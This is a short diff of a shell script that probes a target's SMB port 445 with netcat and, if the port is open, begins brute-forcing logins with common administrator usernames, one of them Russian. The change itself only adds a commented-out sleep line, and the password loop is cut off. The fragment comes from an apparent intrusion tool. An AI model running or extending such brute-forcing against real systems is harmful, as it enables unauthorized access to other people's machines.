@@ -3,6 +3,7 @@
 WAIT=1
 DPORT=445
 
+#sleep 30
 if nc -nw $WAIT $1 $DPORT < /dev/null 2> /dev/null; then
 	echo '[*] bruteforcing smb'
 	for user in администратор administrator admin; do
